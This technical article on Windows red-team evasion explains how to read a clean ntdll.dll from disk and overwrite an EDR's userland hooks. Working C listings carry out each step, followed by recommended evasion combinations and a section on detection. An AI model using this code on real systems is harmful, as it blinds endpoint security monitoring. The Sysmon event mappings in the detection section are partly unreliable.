---
title: "DLL Unhooking — Reading ntdll From Disk to Bypass EDR Hooks"
description: "Reading ntdll.dll from disk to overwrite the EDR's userland hooks — the step-by-step technique, the two offset representations (1024 vs 4096), and the modern context: why unhooking alone is dead and what replaced it."
date: 2026-09-22
type: "Technique · Evasion"
category: "Evasion"
difficulty: "Intermediate"
readingTime: 18
tags: [dll-unhooking, edr-evasion, ntdll, pe-headers, windows-internals, indirect-syscalls, module-stomping, userland-hooks]
---

## The problem

Every EDR on Windows hooks into `ntdll.dll` to intercept system calls. When a process calls a function like `NtAllocateVirtualMemory`, the EDR sees it first. The hook is a small patch in the `.text` section of `ntdll.dll` — the first bytes of the function are overwritten with a `jmp` instruction that redirects execution to the EDR's handler. The EDR inspects the arguments, decides whether to allow the call, and then either executes the original function or returns an error.

For a red teamer, this is a problem. Every syscall the implant makes is inspected before it executes. Allocating memory, injecting into another process, connecting to a C2 — everything is seen.

The solution is to remove the hooks. The on-disk `ntdll.dll` is clean. If you can read the clean version from disk and copy it over the hooked one in memory, the hooks disappear.

There are four known methods for unhooking DLLs:

1. **From disk** — `C:\Windows\System32\ntdll.dll` has never been modified.
2. **From the KnownDlls directory** — a set of DLLs the Windows loader maps for performance.
3. **From a suspended process** — a newly created process loads `ntdll.dll` before any EDR can hook it.
4. **From a web server** — Winbindex and similar services host copies of Windows system DLLs indexed by version.

This article covers the disk-based method: reading `ntdll.dll` from disk with `ReadFile`, and overwriting the hooked `.text` section in memory. For the foundational concepts behind userland hooking, see the [EDR Userland Hooking article](/research/edr-userland-hooking). For the techniques that replaced unhooking in modern operations, see the [SysWhispers3 and Module Stomping article](/research/syswhispers3-hells-gate-module-stomping).

## Step 1 — Reading the clean DLL from disk

The first step is to obtain a clean copy of `ntdll.dll`. We use `ReadFile` (not `MapViewOfFile`) to read the file into a buffer. The function builds the path with `GetWindowsDirectoryA` and `strcat`, opens the file with `CreateFileA`, gets its size with `GetFileSize`, allocates a buffer of that size with `HeapAlloc`, and reads the content with `ReadFile`. Each step is verified; if any fails, the function returns `NULL` instead of the buffer.

```c
#include <windows.h>
#include <stdio.h>

// Reading the DLL from disk

PVOID read_ntdll() {
    char path[MAX_PATH];

    // Build the path to ntdll.dll
    GetWindowsDirectoryA(path, MAX_PATH);
    strcat(path, "\\System32\\ntdll.dll");

    // Open the file
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return NULL;

    // Get the size
    DWORD size = GetFileSize(hFile, NULL);

    // Allocate a buffer
    PVOID buffer = HeapAlloc(GetProcessHeap(), 0, size);
    if (!buffer) {
        CloseHandle(hFile);
        return NULL;
    }

    // Read the file
    DWORD bytesRead;
    ReadFile(hFile, buffer, size, &bytesRead, NULL);
    CloseHandle(hFile);

    // Verify we read the whole thing
    if (bytesRead != size) {
        HeapFree(GetProcessHeap(), 0, buffer);
        return NULL;
    }

    return buffer;
}

int main() {
    PVOID ntdll = read_ntdll();
    if (ntdll) {
        printf("[+] Read ntdll.dll at address %p\n", ntdll);
        HeapFree(GetProcessHeap(), 0, ntdll);
    }
    return 0;
}
```

The offset of the `.text` section in this buffer is **1024** (0x400). This is because `FileAlignment` is 512 bytes for system DLLs, and the section headers are aligned to that boundary. When the same file is mapped into memory instead of read, the offset becomes **4096** (0x1000), because memory sections are aligned to pages. This distinction matters for the final copy step.

## Step 2 — Getting the base address of the hooked ntdll

Now we need the base address of the hooked `ntdll.dll` already loaded in the current process. We use `NtQueryInformationProcess` (a documented API) instead of inline assembly to get the PEB (Process Environment Block), a structure Windows maintains per process.

**What are offsets?** Offsets are distances in bytes from the start of a structure to a specific field. Since C structs are laid out contiguously in memory, each field has a fixed position calculated at compile time. We use numbers (`0x18`, `0x20`, `0x30`) to navigate the structures — these are the exact positions of each field.

`pbi` is a variable of type `PROCESS_BASIC_INFORMATION` that receives the result of `NtQueryInformationProcess`. Inside that structure, the `PebBaseAddress` field contains the address of the PEB.

The `Ldr` (Loader) is a component of the PEB that keeps a record of the modules loaded in the process. Inside `Ldr` is `InMemoryOrderModuleList`, a doubly-linked list where each entry has a `Flink` pointing to the next and a `Blink` pointing to the previous.

The first entry in the list is the local executable. The second entry is `ntdll` — Windows always loads it in that position because it is the first DLL the Loader needs. That is why we access it with `head->Flink->Flink`.

When we reach that entry, we subtract `0x10` bytes to return to the start of the `LDR_DATA_TABLE_ENTRY` structure, and read the `DllBase` field (offset `0x30`), which contains the base address of `ntdll` in the process memory.

```c
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

// Offsets needed to navigate the PEB (x64)
#define PEB_LDR_OFFSET              0x18
#define LDR_INMEMORY_ORDER_OFFSET   0x20
#define LIST_ENTRY_SIZE             0x10
#define LDR_ENTRY_DLL_BASE_OFFSET   0x30

PVOID GetLocalNtdllBase() {
    PROCESS_BASIC_INFORMATION pbi = {0};
    ULONG retLen = 0;

    // Step 1 — get the PEB address using a documented API
    NTSTATUS status = NtQueryInformationProcess(
        GetCurrentProcess(),
        0,                      // ProcessBasicInformation
        &pbi,
        sizeof(pbi),
        &retLen
    );
    if (status != 0 || !pbi.PebBaseAddress) return NULL;

    // Step 2 — read the Ldr pointer from PEB+0x18
    PVOID ldrAddr = *(PVOID*)((PBYTE)pbi.PebBaseAddress + PEB_LDR_OFFSET);
    if (!ldrAddr) return NULL;

    // Step 3 — the InMemoryOrderModuleList head lives at Ldr+0x20
    LIST_ENTRY* head = (LIST_ENTRY*)((PBYTE)ldrAddr + LDR_INMEMORY_ORDER_OFFSET);

    // Step 4 — second entry is ntdll (first is the local exe)
    LIST_ENTRY* entry = head->Flink->Flink;
    if (entry == head) return NULL;

    // Step 5 — convert LIST_ENTRY pointer to the start of LDR_DATA_TABLE_ENTRY
    PVOID ldrEntry = (PVOID)((PBYTE)entry - LIST_ENTRY_SIZE);

    // Step 6 — read DllBase at LDR_ENTRY+0x30
    return *(PVOID*)((PBYTE)ldrEntry + LDR_ENTRY_DLL_BASE_OFFSET);
}

int main() {
    PVOID base = GetLocalNtdllBase();
    if (base) {
        printf("[+] ntdll.dll base address: 0x%p\n", base);
    } else {
        printf("[!] Failed to get ntdll base\n");
    }
    return 0;
}
```

## Step 3 — Getting the .text section of both DLLs

Once we have the base address of both the hooked `ntdll` (in memory) and the clean `ntdll` (in the disk buffer), we need to find the `.text` section in each so we know where and how much to copy.

There are two ways to find it:

**Method 1 — `IMAGE_OPTIONAL_HEADER`:** Simpler, but assumes there is only one code section and that `BaseOfCode` and `SizeOfCode` are correct. It works in practice but does not verify.

**Method 2 — `IMAGE_SECTION_HEADER`:** Iterates the section table one by one until it finds `.text`. More verbose but more precise.

A PE file has several headers. Some are historical and no longer used, like the `IMAGE_DOS_HEADER`. Others are the ones we need, like `IMAGE_NT_HEADERS`, which contains the real executable metadata.

```
┌─────────────────────────────────────┐
│ IMAGE_DOS_HEADER (64 bytes)         │
│   e_magic: "MZ" (0x5A4D)            │  ← we validate this
│   e_lfanew: offset to NT header     │  ← we use this
├─────────────────────────────────────┤
│ DOS Stub                            │
│   "This program cannot be run..."   │  ← historical relic
├─────────────────────────────────────┤
│ IMAGE_NT_HEADERS                    │
│   Signature: "PE\0\0"               │  ← we validate this
│   IMAGE_FILE_HEADER                 │
│     NumberOfSections                │  ← we use this
│   IMAGE_OPTIONAL_HEADER             │
│     BaseOfCode, SizeOfCode          │  ← method 1
├─────────────────────────────────────┤
│ IMAGE_SECTION_HEADER[0] ".text"     │  ← method 2
│ IMAGE_SECTION_HEADER[1] ".rdata"    │
│ IMAGE_SECTION_HEADER[2] ".data"     │
│ ...                                 │
└─────────────────────────────────────┘
```

We define a `TEXT_SECTION` struct with two fields: a pointer to the memory address where the section starts, and the size it occupies. Then we write `GetNtdllTextSection`, which receives the base address and returns a `TEXT_SECTION` with the data.

The function:

1. **Validates it is a PE.** Casts the base address to `PIMAGE_DOS_HEADER` and checks that `e_magic` is `0x5A4D` (`MZ`). This is the PE format signature. If it is not `MZ`, it is not a PE and we exit.

2. **Reaches the NT header.** The `e_lfanew` field of the DOS header is an offset that says how many bytes to add to the start of the file to reach the `IMAGE_NT_HEADERS`. That field is a number (`LONG`), not a pointer. Adding it to the base address gives a pointer to the NT header. We verify that its `Signature` is `PE\0\0`.

3. **Iterates the section table.** `IMAGE_FIRST_SECTION(pNtHdrs)` returns a pointer to the first section in the table. We iterate as many times as `FileHeader.NumberOfSections` says. For each section, we compare its `Name` with `.text` using `strncmp`.

4. **When it finds the `.text` section,** it calculates the absolute address by adding the `VirtualAddress` (an RVA, offset from the base address) to the base address, and saves the size from the `Misc.VirtualSize` field. Returns `TRUE`.

```c
#include <windows.h>
#include <winternl.h>
#include <string.h>
#include <stdio.h>

// Structure to return the .text section data
typedef struct {
    PVOID  address;    // absolute address where .text starts
    SIZE_T size;       // size in bytes
} TEXT_SECTION;

BOOL GetNtdllTextSection(PVOID pNtdllBase, TEXT_SECTION* outSection) {
    if (!pNtdllBase || !outSection) return FALSE;

    // Step 1 — validate it is a PE
    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)pNtdllBase;
    if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[!] Not a PE — MZ signature missing\n");
        return FALSE;
    }

    // Step 2 — reach the NT header
    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pNtdllBase + pDosHdr->e_lfanew);
    if (pNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
        printf("[!] Invalid PE signature\n");
        return FALSE;
    }

    // Step 3 — iterate the sections looking for ".text"
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHdrs);
    for (int i = 0; i < pNtHdrs->FileHeader.NumberOfSections; i++) {

        // Simpler comparison: strncmp against the ".text" string
        if (strncmp((const char*)pSection[i].Name, ".text", 5) == 0) {

            // Found — calculate the absolute address and save the size
            outSection->address = (PVOID)((ULONG_PTR)pNtdllBase + pSection[i].VirtualAddress);
            outSection->size    = pSection[i].Misc.VirtualSize;
            return TRUE;
        }
    }

    printf("[!] .text section not found\n");
    return FALSE;
}

int main() {
    // Step 2 from the article: get the base address of loaded ntdll
    PVOID base = GetModuleHandleA("ntdll.dll");
    if (!base) {
        printf("[!] Failed to get ntdll\n");
        return 1;
    }

    // Step 3: get the .text section
    TEXT_SECTION txt = {0};
    if (GetNtdllTextSection(base, &txt)) {
        printf("[+] .text address: 0x%p\n", txt.address);
        printf("[+] .text size:    0x%llX bytes\n", (unsigned long long)txt.size);
    }

    return 0;
}
```

## Step 4 — Replacing the hooked .text section

With both `.text` addresses (the hooked one in memory, the clean one in the disk buffer) and the section size, the replacement is done with three operations:

1. **`VirtualProtect`** — Change the permissions of the hooked section from `PAGE_EXECUTE_READ` to `PAGE_EXECUTE_WRITECOPY`. Without this, any write to the `ntdll` code crashes the process with an access violation.
2. **`memcpy`** — Copy the clean bytes from the buffer over the hooked bytes in memory. This overwrites the hooks with the original Microsoft code.
3. **`VirtualProtect`** — Restore the original permissions so the section becomes read-execute only again.

The offset detail (1024 vs 4096) is handled by comparing the first 4 bytes of both sections. If they do not match after assuming 1024, we correct by adding 3072 and verify again.

```c
#include <windows.h>
#include <stdio.h>
#include <string.h>

// Structure to return the .text section data
typedef struct {
    PVOID  address;    // absolute address where .text starts
    SIZE_T size;       // size in bytes
} TEXT_SECTION;

// Step 3.1 — Get the .text section of a DLL in memory (or in a buffer)
BOOL GetTextSection(PVOID pBaseAddress, TEXT_SECTION* outSection) {
    if (!pBaseAddress || !outSection) return FALSE;

    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)pBaseAddress;
    if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[!] Not a valid PE — MZ signature missing\n");
        return FALSE;
    }

    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pBaseAddress + pDosHdr->e_lfanew);
    if (pNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
        printf("[!] Invalid PE signature\n");
        return FALSE;
    }

    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHdrs);
    for (int i = 0; i < pNtHdrs->FileHeader.NumberOfSections; i++) {
        if (strncmp((const char*)pSection[i].Name, ".text", 5) == 0) {
            outSection->address = (PVOID)((ULONG_PTR)pBaseAddress + pSection[i].VirtualAddress);
            outSection->size    = pSection[i].Misc.VirtualSize;
            return TRUE;
        }
    }

    printf("[!] .text section not found\n");
    return FALSE;
}

// Step 3.2 — For the ntdll read from disk, the .text offset is 1024.
PVOID GetTextSectionFromDiskBuffer(PVOID pDiskBuffer, SIZE_T* outSize) {
    PVOID textAddr = (PVOID)((ULONG_PTR)pDiskBuffer + 1024);
    return textAddr;
}

// Step 4 — Replace the hooked .text section with the clean one
BOOL ReplaceNtdllTextSection(PVOID pUnhookedNtdll) {
    if (!pUnhookedNtdll) return FALSE;

    PVOID pLocalNtdll = GetModuleHandleA("ntdll.dll");
    if (!pLocalNtdll) return FALSE;

    TEXT_SECTION localText = {0};
    if (!GetTextSection(pLocalNtdll, &localText)) return FALSE;

    PVOID pCleanText = (PVOID)((ULONG_PTR)pUnhookedNtdll + 1024);
    SIZE_T cleanSize = localText.size;

    // Verify we are pointing at the right place by comparing the first bytes
    if (*(ULONG*)localText.address != *(ULONG*)pCleanText) {
        pCleanText = (PVOID)((ULONG_PTR)pCleanText + 3072);
        if (*(ULONG*)localText.address != *(ULONG*)pCleanText) {
            printf("[!] Clean .text section not found\n");
            return FALSE;
        }
    }

    DWORD oldProtect = 0;
    if (!VirtualProtect(localText.address, cleanSize, PAGE_EXECUTE_WRITECOPY, &oldProtect)) {
        printf("[!] VirtualProtect [1] failed: %d\n", GetLastError());
        return FALSE;
    }

    memcpy(localText.address, pCleanText, cleanSize);

    DWORD dummy = 0;
    if (!VirtualProtect(localText.address, cleanSize, oldProtect, &dummy)) {
        printf("[!] VirtualProtect [2] failed: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] ntdll.dll unhooked successfully\n");
    return TRUE;
}

int main() {
    PVOID pCleanNtdll = read_ntdll();
    if (!pCleanNtdll) {
        printf("[!] Failed to read ntdll from disk\n");
        return 1;
    }

    if (ReplaceNtdllTextSection(pCleanNtdll)) {
        printf("[+] Process unhooked\n");
    } else {
        printf("[!] Unhooking failed\n");
    }

    HeapFree(GetProcessHeap(), 0, pCleanNtdll);
    return 0;
}
```

## Limitations — why unhooking is not enough

Unhooking solves one specific problem: userland hooks that an EDR places in `ntdll.dll`. But a modern EDR does not rely on those hooks alone. It has at least five telemetry layers, and unhooking neutralizes only one.

| Detection layer | Does unhooking bypass it? |
|---|---|
| Userland hooks in ntdll | Yes — this is exactly what it does |
| Kernel callbacks (`PsSetCreateProcessNotifyRoutine`) | No |
| ETW (Event Tracing for Windows) | No — still emits events from the kernel |
| ETW-Ti (Threat Intelligence provider) | No — kernel-mode, cannot be disabled from userland |
| Memory scanning (periodic, from the process space) | Partially — depends on frequency and scan type |

**The "hook removed" problem.** Many EDRs monitor the integrity of their own hooks. If the `.text` of `ntdll` changes — because the hooked bytes were overwritten with the originals — the EDR generates an alert. It does not matter that the process is now "clean"; the change itself is the indicator.

**The timing problem.** Even if the unhooking is successful, the EDR already saw the operations performed before unhooking. If you opened a file to read `ntdll` from disk, the EDR logged it. If you created a suspended process to copy its `ntdll`, the EDR logged it. Unhooking does not erase the telemetry already generated.

**The clean copy problem.** When you read `ntdll` from disk, the file you get is not the same as the one Windows loaded into memory. The file on disk may be older (if Windows was not updated) or newer (if Windows was updated after boot). If the versions do not match, the section offsets and function content may not align, and the unhooking fails silently or corrupts memory.

## How an EDR detects unhooking

Modern EDRs detect unhooking in real time. The signals are specific:

**Sysmon Event ID 7 (Image Load).** When a process reads `ntdll` from disk, it may load a second copy of the module into memory. Sysmon records every image load. A second `ntdll.dll` in the same process is anomalous — normal processes load the module once.

**Sysmon Event ID 10 (ProcessAccess).** When the malware opens a handle to the current process with write permissions over executable memory, that is logged. Combined with the subsequent modification of `ntdll`, it is a strong signal.

**Memory integrity verification.** More advanced EDRs periodically compare the `.text` in memory against the `.text` on disk. If the bytes do not match, the EDR alerts. The technique to evade this is to not modify the bytes at all — which is exactly what indirect syscalls do.

**ETW-Ti (Threat Intelligence).** This is the real problem. ETW-Ti is a kernel-mode telemetry provider that Microsoft exposes to EDRs. It emits events like `NtProtectVirtualMemory` or `NtAllocateVirtualMemory` directly from the kernel. Userland unhooking cannot disable it because it operates on a completely different layer.

**Call stack analysis.** When a syscall executes, the EDR can inspect the call stack. A syscall that reaches the kernel from an address outside `ntdll` is suspicious. This is what motivated the development of indirect syscalls — so the `syscall` executes from inside `ntdll` and the return address appears legitimate.

## How to make it stealthier — the state of the art

Unhooking alone is a losing race against modern EDRs. The only way to stay relevant is to combine it with other techniques. These are the ones that matter.

### Indirect syscalls — the key technique

A **direct syscall** executes the `syscall` instruction from your own code. The EDR detects it because the return address on the stack points to your binary, not to `ntdll`.

An **indirect syscall** does `jmp` to the `syscall` instruction that already exists inside `ntdll`. The kernel receives the syscall with a return address pointing inside `ntdll.dll`, which looks legitimate. The userland hook is bypassed, but the call stack is not altered.

As of 2026, **indirect syscalls remain effective against most EDRs**. Unhooking is easily detectable; indirect syscalls are not. For a full breakdown of direct vs indirect syscalls and how they interact with userland hooks, see the [EDR Userland Hooking article](/research/edr-userland-hooking).

### Module stomping

Instead of injecting your payload into private memory (`MEM_PRIVATE`), you inject it into the `.text` section of a legitimate DLL already loaded (for example, `apphelp.dll` or `wmp.dll`). The memory scanner sees `MEM_IMAGE` — code backed by a file on disk — and does not generate an alert. The EDR looking for "unbacked executable memory" sees nothing.

**The winning combination:** do indirect syscalls from a stomped region inside a legitimate DLL. The syscall exits from inside `ntdll`, and the code that invokes it lives inside a signed DLL. Both detection layers are covered. For the full technique, see the [SysWhispers3 and Module Stomping article](/research/syswhispers3-hells-gate-module-stomping).

### ETW patching

ETW is Windows' logging system. EDRs consume ETW for telemetry. Patching `EtwEventWrite` so it returns without writing events reduces the EDR's visibility. The problem: the EDR can verify the integrity of `EtwEventWrite` and detect the patch.

### Sleep obfuscation

Your payload is not always executing. When it "sleeps" (waiting for C2 commands, for example), the EDR can scan memory and find the shellcode. Sleep obfuscation encrypts the payload during sleep and decrypts it before executing, so the scanner only sees ciphertext.

### Hardware breakpoints (Blindside)

The most recent technique. Instead of reading `ntdll` from disk or from a suspended process, the attacker uses **hardware breakpoints** and the **debugging API** to create a child process in debug mode, intercept `LdrLoadDll` before the EDR can load its DLLs, and copy the clean `ntdll` from the child. The EDR has no opportunity to hook that copy because the hook is never applied.

## The best combination (state of the art 2026)

No single technique defeats all EDRs. The current strategy is **offensive defense-in-depth**: combine several layers to cover each one's blind spots.

| Detection layer | Technique that evades it |
|---|---|
| Userland hooks in ntdll | Indirect syscalls |
| Memory scanning (unbacked memory) | Module stomping |
| ETW logging | ETW patching |
| Memory scanning (sleep time) | Sleep obfuscation |
| Suspended process detection | Hardware breakpoints (Blindside) |

**The combination EDRs have the hardest time detecting:**

1. **Indirect syscalls** for all `Nt*` calls. No userland hooks because they are never called.
2. **Module stomping** for the shellcode and implant logic. All executable code lives inside a signed DLL.
3. **Sleep obfuscation** for when the implant is inactive.
4. **ETW patching** to reduce kernel telemetry.

Unhooking **is no longer the primary technique** — it is a support technique. If you are going to use unhooking, the modern version combines:

- **Halo's Gate** to resolve SSNs dynamically (because hooked stubs no longer have the SSN visible)
- **Indirect syscalls** for the actual execution
- **Module stomping** for payload storage

## Detection — what the EDR sees

From the EDR's perspective, the unhooking chain produces a specific pattern:

- A process opens `C:\Windows\System32\ntdll.dll` for reading — Sysmon Event ID 1 (process creation) and ID 11 (file create) capture this.
- A new memory region is allocated with `HeapAlloc` or `VirtualAlloc` — Sysmon Event ID 10 (process access) may capture this.
- `VirtualProtect` is called on the `.text` section of `ntdll` — changing memory permissions on a system DLL is a high-signal event.
- `memcpy` overwrites the hooked bytes — the memory modification itself is the indicator.

An EDR that correlates these events — "process read ntdll from disk" + "process modified ntdll .text" — catches the technique reliably.

## Takeaways

Unhooking works against naive hooks. It does not work against EDRs that verify module integrity, monitor ETW from the kernel, or use hardware-level telemetry.

The technique is a starting point, not a destination. The state of the art is a combination: indirect syscalls for execution, module stomping for storage, sleep obfuscation for idle time, and ETW patching for telemetry reduction. Unhooking is one piece of a larger puzzle.

The detection problem for defenders is not "did someone unhook ntdll" — it is "did the process modify a system DLL that it has no legitimate reason to touch." That question is answerable with the right telemetry, and the answer is usually yes.
